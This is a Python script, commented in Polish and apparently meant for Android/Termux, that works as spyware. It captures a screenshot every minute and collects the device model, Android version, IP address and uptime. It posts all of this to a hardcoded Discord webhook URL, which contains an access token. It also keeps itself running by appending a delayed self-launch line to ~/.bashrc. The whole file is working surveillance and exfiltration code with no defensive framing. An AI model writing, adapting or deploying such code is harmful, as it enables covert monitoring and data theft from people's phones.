#!/usr/bin/env python3
import subprocess
import os
import time
import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1509286003586633929/J1B7qGfkiV7c1KRSZli3nB-Ua6ydFfR2d1GpShtTBEml2NaRT2UfBGKBbLaVXgwhqbHF"

def send_screenshot():
    """Zrób screena i wyślij do Discord"""
    try:
        # Zrzut ekranu
        cmd = "screencap -p /sdcard/screen.png"
        subprocess.run(cmd, shell=True, timeout=10)
        
        if os.path.exists("/sdcard/screen.png"):
            with open("/sdcard/screen.png", "rb") as f:
                files = {"file": ("screen.png", f, "image/png")}
                requests.post(WEBHOOK_URL, files=files)
                print("[+] Screenshot wysłany")
    except Exception as e:
        print(f"[-] Screenshot error: {e}")

def send_info():
    """Zbierz info o urządzeniu"""
    try:
        model = subprocess.check_output(['getprop', 'ro.product.model']).decode().strip()
        android_ver = subprocess.check_output(['getprop', 'ro.build.version.release']).decode().strip()
        uptime = subprocess.check_output(['uptime']).decode().strip()
        
        # IP
        try:
            ip = subprocess.check_output(['hostname', '-I']).decode().strip()
        except:
            ip = "brak IP"
        
        info = f"""
**Device Info**
- Model: {model}
- Android: {android_ver}
- IP: {ip}
- Uptime: {uptime}
"""
        requests.post(WEBHOOK_URL, content=info)
        print("[+] Info wysłane")
    except Exception as e:
        print(f"[-] Info error: {e}")

def persistence():
    """Dodaj do autostartu Termux"""
    script_path = os.path.abspath(__file__)
    bashrc = os.path.expanduser("~/.bashrc")
    
    # Utwórz .bashrc jeśli nie istnieje
    if not os.path.exists(bashrc):
        open(bashrc, 'w').close()
        print("[+] Utworzono .bashrc")
    
    entry = f"(sleep 30 && python3 {script_path}) &\n"
    
    with open(bashrc, 'r') as f:
        content = f.read()
    
    if entry not in content:
        with open(bashrc, 'a') as f:
            f.write(entry)
        print("[+] Dodano do autostartu .bashrc")
    else:
        print("[*] Już jest w autostarcie")

if __name__ == "__main__":
    print("[*] Start skryptu zbierającego...")
    
    # Persistence
    persistence()
    
    # Pętla co 1 minuta
    while True:
        send_info()
        send_screenshot()
        time.sleep(60)
